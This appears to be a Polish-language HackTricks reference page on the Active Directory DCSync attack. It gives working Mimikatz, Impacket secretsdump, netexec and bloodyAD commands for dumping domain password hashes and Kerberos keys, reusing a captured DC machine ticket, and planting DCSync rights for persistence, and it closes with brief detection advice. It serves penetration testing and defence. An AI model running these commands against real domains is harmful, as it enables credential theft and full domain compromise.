# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie następujących uprawnień do samej domeny: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Ważne uwagi dotyczące DCSync:**

- **Atak DCSync symuluje działanie kontrolera domeny i prosi inne kontrolery domeny o replikację informacji** za pomocą protokołu Directory Replication Service Remote Protocol (MS-DRSR). Ponieważ MS-DRSR jest prawidłową i niezbędną funkcją Active Directory, nie można go wyłączyć ani dezaktywować.
- Domyślnie wymagane uprawnienia mają tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers**.
- W praktyce **pełny DCSync** wymaga uprawnień **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** w kontekście nazewnictwa domeny. Uprawnienie `DS-Replication-Get-Changes-In-Filtered-Set` jest często delegowane razem z nimi, ale samo w sobie jest bardziej przydatne do synchronizowania **atrybutów poufnych / filtrowanych przez RODC** (na przykład sekretów w stylu starszego LAPS) niż do pełnego zrzutu krbtgt.<sup>[[2]](#references)</sup>
- Jeśli hasła jakichkolwiek kont są przechowywane przy użyciu szyfrowania odwracalnego, Mimikatz udostępnia opcję zwrócenia hasła w postaci jawnego tekstu.

### Enumeracja

Sprawdź, kto ma te uprawnienia, używając `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Jeśli chcesz skupić się na **podmiotach innych niż domyślne** z uprawnieniami DCSync, odfiltruj wbudowane grupy zdolne do replikacji i przejrzyj tylko nieoczekiwane podmioty z przypisanymi uprawnieniami:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit lokalnie

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit zdalnie

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktyczne przykłady o określonym zakresie:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync z użyciem przechwyconego TGT maszyny DC (ccache)

Podczas analizy usługi na kontrolerze domeny rozróżniaj jej lokalną tożsamość usługi od tożsamości sieciowej. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), że wirtualne konta SQL Server (`NT SERVICE\...`) uzyskują dostęp do zasobów sieciowych jako konto komputera hosta. Na kontrolerze domeny oznacza to, że konto maszyny DC może mieć znaczenie przy weryfikacji uprawnień do replikacji, ale samo uzyskanie dostępu do usługi nie potwierdza, że można wyeksportować TGT maszyny ani użyć go do uwierzytelnienia DCSync. Przed uznaniem tego za możliwą ścieżkę zweryfikuj faktyczną tożsamość usługi, kontekst uwierzytelniania wychodzącego, dostępny bilet lub dane uwierzytelniające oraz efektywne uprawnienia do replikacji.

W scenariuszach z unconstrained delegation w trybie eksportu możesz przechwycić TGT maszyny kontrolera domeny (np. `DC1$@DOMAIN` dla `krbtgt@DOMAIN`). Następnie możesz użyć tego ccache do uwierzytelnienia się jako DC i przeprowadzić DCSync bez hasła.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Uwagi operacyjne:

- **Ścieżka Kerberos w Impacket najpierw korzysta z SMB**, zanim wywoła DRSUAPI. Jeśli w środowisku wymuszana jest **weryfikacja nazwy docelowej SPN**, pełny zrzut może się nie powieść z komunikatem `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- W takim przypadku najpierw zażądaj biletu usługi **`cifs/<dc>`** dla docelowego DC albo użyj **`-just-dc-user`**, aby od razu pobrać dane potrzebnego konta.
- Jeśli masz tylko niższe uprawnienia do replikacji, synchronizacja w stylu LDAP/DirSync może nadal ujawnić atrybuty **poufne** lub **filtrowane przez RODC** (na przykład starszy atrybut `ms-Mcs-AdmPwd`) bez pełnej replikacji krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami w postaci jawnej z NTDS dla wszystkich kont, na których włączono [**szyfrowanie odwracalne**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Użytkowników z włączonym szyfrowaniem odwracalnym można znaleźć za pomocą

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Jeśli jesteś administratorem domeny, możesz przyznać te uprawnienia dowolnemu użytkownikowi za pomocą PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Operatorzy Linuksa mogą zrobić to samo za pomocą `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Następnie możesz **sprawdzić, czy użytkownikowi poprawnie przypisano** 3 uprawnienia, wyszukując je w wynikach (powinieneś móc zobaczyć nazwy uprawnień w polu „ObjectType”):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Ograniczanie ryzyka

- Security Event ID 4662 (musi być włączona Audit Policy dla obiektu) – Wykonano operację na obiekcie<sup>[[4]](#references)</sup>
- Security Event ID 5136 (musi być włączona Audit Policy dla obiektu) – Zmodyfikowano obiekt usługi katalogowej
- Security Event ID 4670 (musi być włączona Audit Policy dla obiektu) – Zmieniono uprawnienia do obiektu
- AD ACL Scanner - Twórz i porównuj raporty ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Dziennik zmian Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Wykorzystanie replikacji Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Zrzucanie hashy haseł z kontrolera domeny](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — dane logowania SYSVOL → ukierunkowany Kerberoast → nieograniczona delegacja → DCSync w celu uzyskania uprawnień DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
